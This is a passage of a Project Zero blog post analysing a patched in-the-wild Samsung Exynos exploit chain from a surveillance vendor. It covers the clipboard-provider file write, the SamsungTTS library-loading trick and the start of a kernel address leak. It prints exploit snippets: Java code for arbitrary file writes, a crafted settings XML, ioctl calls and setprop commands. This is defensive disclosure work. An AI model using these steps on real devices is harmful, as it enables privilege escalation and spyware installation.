> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [googleprojectzero.blogspot.com](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html)

> Maddie Stone, Project Zero Note : The three vulnerabilities discussed in this blog were all fixed in ......

Maddie Stone, Project Zero

**Note**: The three vulnerabilities discussed in this blog were all fixed in Samsung’s March 2021 release. They were fixed as CVE-2021-25337, CVE-2021-25369, CVE-2021-25370. To ensure your Samsung device is up-to-date under settings you can check that your device is running SMR Mar-2021 or later.

As defenders, in-the-wild exploit samples give us important insight into what attackers are really doing. We get the “ground truth” data about the vulnerabilities and exploit techniques they’re using, which then informs our further research and guidance to security teams on what could have the biggest impact or return on investment. To do this, we need to know that the vulnerabilities and exploit samples were found in-the-wild. Over the past few years there’s been tremendous progress in vendor’s transparently disclosing when a vulnerability is known to be exploited in-the-wild: Adobe, Android, Apple, ARM, Chrome, Microsoft, Mozilla, and others are sharing this information via their security release notes.

While we understand that Samsung has yet to annotate any vulnerabilities as in-the-wild, going forward, Samsung has committed to publicly sharing when vulnerabilities may be under limited, targeted exploitation, as part of their release notes. 

We hope that, like Samsung, others will join their industry peers in disclosing when there is evidence to suggest that a vulnerability is being exploited in-the-wild in one of their products. 

The Google Threat Analysis Group (TAG) obtained a partial exploit chain for Samsung devices that TAG believes belonged to a commercial surveillance vendor. These exploits were likely discovered in the testing phase. The sample is from late 2020. The chain merited further analysis because it is a 3 vulnerability chain where all 3 vulnerabilities are within Samsung custom components, including a vulnerability in a Java component. This exploit analysis was completed in collaboration with Clement Lecigne from TAG.

The sample used three vulnerabilities, all patched in March 2021 by Samsung: 

1.  Arbitrary file read/write via the clipboard provider - CVE-2021-25337
    
2.  Kernel information leak via sec_log - CVE-2021-25369
    
3.  Use-after-free the Display Processing Unit (DPU) driver - CVE-2021-25370
    

The exploit sample targets Samsung phones running kernel 4.14.113 with the Exynos SOC. Samsung phones run one of two types of SOCs depending on where they’re sold. For example the Samsung phones sold in the United States, China, and a few other countries use a Qualcomm SOC and phones sold most other places (ex. Europe and Africa) run an Exynos SOC. The exploit sample relies on both the Mali GPU driver and the DPU driver which are specific to the Exynos Samsung phones.

Examples of Samsung phones that were running kernel 4.14.113 in late 2020 (when this sample was found) include the S10, A50, and A51.

The in-the-wild sample that was obtained is a JNI native library file that would have been loaded as a part of an app. Unfortunately TAG did not obtain the app that would have been used with this library. Getting initial code execution via an application is a path that we’ve seen in other campaigns this year. [TAG](https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/) and [Project Zero](https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html) published detailed analyses of one of these campaigns in June. 

The exploit chain used CVE-2021-25337 for an initial arbitrary file read and write. The exploit is running as the untrusted_app SELinux context, but uses the system_server SELinux context to open files that it usually wouldn’t be able to access. This bug was due to a lack of access control in a custom Samsung clipboard provider that runs as the system user. 

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/w640-h108/image2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png)

About Android content providers

In Android, [Content Providers](https://developer.android.com/guide/topics/providers/content-providers) manage the storage and system-wide access of different data. Content providers organize their data as tables with columns representing the type of data collected and the rows representing each piece of data. Content providers are [required to implement six abstract methods](https://developer.android.com/guide/topics/providers/content-provider-creating#ContentProvider): query, insert, update, delete, getType, and onCreate. All of these methods besides onCreate are called by a client application.

According to the [Android documentation](https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions):

  
All applications can read from or write to your provider, even if the underlying data is private, because by default your provider does not have permissions set. To change this, set permissions for your provider in your manifest file, using attributes or child elements of the <provider> element. You can set permissions that apply to the entire provider, or to certain tables, or even to certain records, or all three.

The vulnerability
-----------------

Samsung created a custom clipboard content provider that runs within the system server. The [system server](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/java/com/android/server/SystemServer.java) is a very privileged process on Android that manages many of the services critical to the functioning of the device, such as the WifiService and TimeZoneDetectorService. The system server runs as the privileged system user (UID 1000, AID_system) and under the system_server SELinux context.

Samsung added a custom clipboard content provider to the system server. This custom clipboard provider is specifically for images. In the com.android.server.semclipboard.SemClipboardProvider class, there are the following variables:  
DATABASE_NAME = ‘clipboardimage.db’

TABLE_NAME = ‘ClipboardImageTable’

URL = ‘content://com.sec.android.semclipboardprovider/images’

CREATE_TABLE = "CREATE TABLE ClipboardImageTable (id INTEGER PRIMARY KEY AUTOINCREMENT,  _data TEXT NOT NULL);";

Unlike content providers that live in “normal” apps and can restrict access via permissions in their manifest as explained above, content providers in the system server are responsible for restricting access in their own code. The system server is a single JAR (services.jar) on the firmware image and doesn’t have a manifest for any permissions to go in. Therefore it’s up to the code within the system server to do its own access checking. 

The ClipboardImageTable defines only two columns for the table as seen above: id and _data. The column name _data has a special use in Android content providers. It can be used with the [openFileHelper](https://developer.android.com/reference/android/content/ContentProvider#openFileHelper(android.net.Uri,%20java.lang.String)) method to open a file at a specified path. Only the URI of the row in the table is passed to openFileHelper and a [ParcelFileDescriptor](https://developer.android.com/reference/android/os/ParcelFileDescriptor) object for the path stored in that row is returned. The ParcelFileDescriptor class then provides the [getFd](https://developer.android.com/reference/android/os/ParcelFileDescriptor#getFd()) method to get the native file descriptor (fd) for the returned ParcelFileDescriptor. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">&nbsp; &nbsp; public Uri insert(Uri uri, ContentValues values) {</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long row = this.database.insert(TABLE_NAME, "", values);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (row &gt; 0) {</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Uri newUri = ContentUris.withAppendedId(CONTENT_URI, row);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getContext().getContentResolver().notifyChange(newUri, null);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return newUri;</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new SQLException("Fail to add a new record into" + uri);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;}</p></td></tr></tbody></table>

The function above is the vulnerable insert() method in com.android.server.semclipboard.SemClipboardProvider. There is no access control included in this function so any app, including the untrusted_app SELinux context, can modify the _data column directly. By calling insert, an app can open files via the system server that it wouldn’t usually be able to open on its own.

The exploit triggered the vulnerability with the following code from an untrusted application on the device. This code returned a raw file descriptor.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">ContentValues vals = new ContentValues();</p><p dir="ltr">vals.put("_data", "/data/system/users/0/newFile.bin");</p><p dir="ltr">URI semclipboard_uri = URI.parse("content://com.sec.android.semclipboardprovider")</p><p dir="ltr">ContentResolver resolver = getContentResolver();</p><p dir="ltr">URI newFile_uri = resolver.insert(semclipboard_uri, vals);</p><p dir="ltr">return resolver.openFileDescriptor(newFile_uri, "w").getFd();&nbsp;</p></td></tr></tbody></table>

Let’s walk through what is happening line by line:

1.  Create a [ContentValues](https://developer.android.com/reference/android/content/ContentValues) object. This holds the key, value pair that the caller wants to insert into a provider’s database table. The key is the column name and the value is the row entry.
    
2.  Set the ContentValues object: the key is set to “_data” and the value to an arbitrary file path, controlled by the exploit.
    
3.  Get the URI to access the semclipboardprovider. This is set in the SemClipboardProvider class.
    
4.  Get the [ContentResolver](https://developer.android.com/reference/android/content/ContentResolver) object that allows apps access to ContentProviders.
    
5.  Call insert on the semclipboardprovider with our key-value pair.
    
6.  Open the file that was passed in as the value and return the raw file descriptor. openFileDescriptor calls the content provider’s openFile, which in this case simply calls openFileHelper.
    

The exploit wrote their next stage binary to the directory /data/system/users/0/. The dropped file will have an SELinux context of users_system_data_file. Normal untrusted_app’s don’t have access to open or create users_system_data_file files so in this case they are proxying the open through system_server who can open users_system_data_file. While untrusted_app can’t open users_system_data_file, it can read and write to users_system_data_file. Once the clipboard content provider opens the file and passess the fd to the calling process, the calling process can now read and write to it.

The exploit first uses this fd to write their next stage ELF file onto the file system. The contents for the stage 2 ELF were embedded within the original sample.

This vulnerability is triggered three more times throughout the chain as we’ll see below.

Fixing the vulnerability
------------------------

To fix the vulnerability, Samsung added access checks to the functions in the SemClipboardProvider. The insert method now checks if the PID of the calling process is UID 1000, meaning that it is already also running with system privileges.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">&nbsp; public Uri insert(Uri uri, ContentValues values) {</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (Binder.getCallingUid() != 1000) {</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Log.e(TAG, "Fail to insert image clip uri. blocked the access of package :" + getContext().getPackageManager().getNameForUid(Binder.getCallingUid()));</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long row = this.database.insert(TABLE_NAME, "", values);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (row &gt; 0) {</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Uri newUri = ContentUris.withAppendedId(CONTENT_URI, row);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getContext().getContentResolver().notifyChange(newUri, null);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return newUri;</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new SQLException("Fail to add a new record into" + uri);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;}</p></td></tr></tbody></table>

Executing the stage 2 ELF
-------------------------

The exploit has now written its stage 2 binary to the file system, but how do they load it outside of their current app sandbox? Using the Samsung Text to Speech application (SamsungTTS.apk).

The [Samsung Text to Speech application (com.samsung.SMT)](https://galaxystore.samsung.com/detail/com.samsung.SMT?langCd=en) is a pre-installed system app running on Samsung devices. It is also running as the system UID, though as a slightly less privileged SELinux context, system_app rather than system_server. There has been at least one previously public vulnerability where this app was used [to gain code execution as system](https://blog.flanker017.me/text-to-speech-speaks-pwned/). What’s different this time though is that the exploit doesn’t need another vulnerability; instead it reuses the stage 1 vulnerability in the clipboard to arbitrarily write files on the file system.

Older versions of the SamsungTTS application stored the file path for their engine in their Settings files. When a service in the application was started, it obtained the path from the Settings file and would load that file path as a native library using the [System.load](https://developer.android.com/reference/java/lang/System#load(java.lang.String)) API. 

The exploit takes advantage of this by using the stage 1 vulnerability to write its file path to the Settings file and then starting the service which will then load its stage 2 executable file as system UID and system_app SELinux context.

To do this, the exploit uses the stage 1 vulnerability to write the following contents to two different files: /data/user_de/0/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml and /data/data/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml. Depending on the version of the phone and application, the SamsungTTS app uses these 2 different paths for its Settings files.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;map&gt;</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string name=\"eng-USA-Variant Info\"&gt;f00&lt;/string&gt;\n"</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string name=\"SMT_STUBCHECK_STATUS\"&gt;STUB_SUCCESS&lt;/string&gt;\n"</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string name=\"SMT_LATEST_INSTALLED_ENGINE_PATH\"&gt;/data/system/users/0/newFile.bin&lt;/string&gt;\n"</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/map&gt;</p></td></tr></tbody></table>

The SMT_LATEST_INSTALLED_ENGINE_PATH is the file path passed to System.load(). To initiate the process of the system loading, the exploit stops and restarts the SamsungTTSService by sending two intents to the application. The SamsungTTSService then initiates the load and the stage 2 ELF begins executing as the system user in the system_app SELinux context. 

The exploit sample is from at least November 2020. As of November 2020, some devices had a version of the SamsungTTS app that did this arbitrary file loading while others did not. App versions 3.0.04.14 and before included the arbitrary loading capability. It seems like devices released on Android 10 (Q) were released with the updated version of the SamsungTTS app which did not load an ELF file based on the path in the settings file. For example, the A51 device that launched in late 2019 on Android 10 launched with version 3.0.08.18 of the SamsungTTS app, which does not include the functionality that would load the ELF.

Phones released on Android P and earlier seemed to have a version of the app pre-3.0.08.18 which does load the executable up through December 2020. For example, the SamsungTTS app from [this A50 device](https://www.sammobile.com/samsung/galaxy-a50/firmware/SM-A505F/XID/download/A505FDDS5BTJA/517463/) on the November 2020 security patch level was 3.0.03.22, which did load from the Settings file. 

Once the ELF file is loaded via the System.load api, it begins executing. It includes two additional exploits to gain kernel read and write privileges as the root user.

Once the second stage ELF is running (and as system), the exploit then continued. The second vulnerability (CVE-2021-25369) used by the chain is an information leak to leak the address of the task_struct and sys_call_table. The leaked sys_call_table address is used to defeat KASLR. The addr_limit pointer, which is used later to gain arbitrary kernel read and write, is calculated from the leaked task_struct address.

The vulnerability is in the access permissions of a custom Samsung logging file: /data/log/sec_log.log.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/w640-h128/image3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png)

The exploit abused a WARN_ON in order to leak the two kernel addresses and therefore break ASLR. WARN_ON is intended to only be used in situations where a kernel bug is detected because it prints a full backtrace, including stack trace and register values, to the kernel logging buffer, /dev/kmsg. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">oid __warn(const char *file, int line, void *caller, unsigned taint,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct pt_regs *regs, struct warn_args *args)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; disable_trace_on_warning();</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; pr_warn("------------[cut here]------------\n");</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (file)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pr_warn("WARNING: CPU: %d PID: %d at %s:%d %pS\n",</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; raw_smp_processor_id(), current-&gt;pid, file, line,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; caller);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; else</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pr_warn("WARNING: CPU: %d PID: %d at %pS\n",</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; raw_smp_processor_id(), current-&gt;pid, caller);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (args)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; vprintk(args-&gt;fmt, args-&gt;args);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (panic_on_warn) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /*</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* This thread may hit another WARN() in the panic path.</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Resetting this prevents additional WARN() from panicking the</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* system on this thread. &nbsp;Other threads are blocked by the</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* panic_mutex in panic().</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; panic_on_warn = 0;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; panic("panic_on_warn set ...\n");</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; print_modules();</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; dump_stack();</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; print_oops_end_marker();</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; /* Just a warning, don't kill lockdep. */</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; add_taint(taint, LOCKDEP_STILL_OK);</p><p dir="ltr">}</p><br></td></tr></tbody></table>

On Android, the ability to read from kmsg is scoped to privileged users and contexts. While kmsg is readable by system_server, it is not readable from the system_app context, which means it’s not readable by the exploit. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">a51:/ $ ls -alZ /dev/kmsg</p><p dir="ltr">crw-rw---- 1 root system u:object_r:kmsg_device:s0 1, 11 2022-10-27 21:48 /dev/kmsg</p><p dir="ltr">$ sesearch -A -s system_server -t kmsg_device -p read precompiled_sepolicy</p><p dir="ltr">allow domain dev_type:lnk_file { getattr ioctl lock map open read };</p><p dir="ltr">allow system_server kmsg_device:chr_file { append getattr ioctl lock map open read write };</p></td></tr></tbody></table>

Samsung however has added a custom logging feature that copies kmsg to the sec_log. The sec_log is a file found at /data/log/sec_log.log. 

The WARN_ON that the exploit triggers is in the Mali GPU graphics driver provided by ARM. ARM replaced the WARN_ON with a call to the more appropriate helper pr_warn in [release BX304L01B-SW-99002-r21p0-01rel1 in February 2020](https://developer.arm.com/downloads/-/mali-drivers/bifrost-kernel). However, the A51 (SM-A515F) and A50 (SM-A505F)  still used a vulnerable version of the driver (r19p0) as of January 2021.  

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">/**</p><p dir="ltr">&nbsp;* kbasep_vinstr_hwcnt_reader_ioctl() - hwcnt reader's ioctl.</p><p dir="ltr">&nbsp;* @filp: &nbsp; Non-NULL pointer to file structure.</p><p dir="ltr">&nbsp;* @cmd: &nbsp; &nbsp;User command.</p><p dir="ltr">&nbsp;* @arg: &nbsp; &nbsp;Command's argument.</p><p dir="ltr">&nbsp;*</p><p dir="ltr">&nbsp;* Return: 0 on success, else error code.</p><p dir="ltr">&nbsp;*/</p><p dir="ltr">static long kbasep_vinstr_hwcnt_reader_ioctl(</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct file *filp,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; unsigned int cmd,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; unsigned long arg)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; long rcode;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct kbase_vinstr_client *cli;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (!filp || (_IOC_TYPE(cmd) != KBASE_HWCNT_READER))</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; cli = filp-&gt;private_data;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (!cli)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; switch (cmd) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; case KBASE_HWCNT_READER_GET_API_VERSION:</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode = put_user(HWCNT_READER_API, (u32 __user *)arg);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; case KBASE_HWCNT_READER_GET_HWVER:</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode = kbasep_vinstr_hwcnt_reader_ioctl_get_hwver(</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cli, (u32 __user *)arg);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; case KBASE_HWCNT_READER_GET_BUFFER_SIZE:</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode = put_user(</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (u32)cli-&gt;vctx-&gt;metadata-&gt;dump_buf_bytes,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (u32 __user *)arg);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; [...]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; default:</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WARN_ON(true);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode = -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return rcode;</p><p dir="ltr">}</p></td></tr></tbody></table>

Specifically the WARN_ON is in the function kbase_vinstr_hwcnt_reader_ioctl. To trigger, the exploit only needs to call an invalid ioctl number for the HWCNT driver and the WARN_ON will be hit. The exploit makes two ioctl calls: the first is the Mali driver’s HWCNT_READER_SETUP ioctl to initialize the hwcnt driver and be able to call ioctl’s and then to the hwcnt ioctl target with an invalid ioctl number: 0xFE.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">&nbsp; hwcnt_fd = ioctl(dev_mali_fd, 0x40148008, &amp;v4);</p><p dir="ltr">&nbsp;&nbsp;&nbsp;ioctl(hwcnt_fd, 0x4004BEFE, 0);</p></td></tr></tbody></table>

To trigger the vulnerability the exploit sends an invalid ioctl to the HWCNT driver a few times and then triggers a bug report by calling:

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">setprop dumpstate.options bugreportfull;</p><p dir="ltr">setprop ctl.start bugreport;</p></td></tr></tbody></table>

In Android, the property ctl.start starts a service that is defined in init. On the targeted Samsung devices, the SELinux policy for who has access to the ctl.start property is much more permissive than AOSP’s policy. Most notably in this exploit’s case, system_app has access to set ctl_start and thus initiate the bugreport. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">allow at_distributor ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow at_distributor ctl_start_prop:property_service set;</p><p dir="ltr">allow bootchecker ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow bootchecker ctl_start_prop:property_service set;</p><p dir="ltr">allow dumpstate property_type:file { getattr map open read };</p><p dir="ltr">allow hal_keymaster_default ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow hal_keymaster_default ctl_start_prop:property_service set;</p><p dir="ltr">allow ikev2_client ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow ikev2_client ctl_start_prop:property_service set;</p><p dir="ltr">allow init property_type:file { append create getattr map open read relabelto rename setattr unlink write };</p><p dir="ltr">allow init property_type:property_service set;</p><p dir="ltr">allow keystore ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow keystore ctl_start_prop:property_service set;</p><p dir="ltr">allow mediadrmserver ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow mediadrmserver ctl_start_prop:property_service set;</p><p dir="ltr">allow multiclientd ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow multiclientd ctl_start_prop:property_service set;</p><p dir="ltr">allow radio ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow radio ctl_start_prop:property_service set;</p><p dir="ltr">allow shell ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow shell ctl_start_prop:property_service set;</p><p dir="ltr">allow surfaceflinger ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow surfaceflinger ctl_start_prop:property_service set;</p><p dir="ltr">allow system_app ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow system_app ctl_start_prop:property_service set;</p><p dir="ltr">allow system_server ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow system_server ctl_start_prop:property_service set;</p><p dir="ltr">allow vold ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow vold ctl_start_prop:property_service set;</p><p dir="ltr">allow wlandutservice ctl_start_prop:file { getattr map open read };</p><p dir="ltr">allow wlandutservice ctl_start_prop:property_service set;</p></td></tr></tbody></table>

The bugreport service is defined in /system/etc/init/dumpstate.rc:

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">service bugreport /system/bin/dumpstate -d -p -B -z \</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-o /data/user_de/0/com.android.shell/files/bugreports/bugreport</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;class main</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;disabled</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;oneshot</p></td></tr></tbody></table>

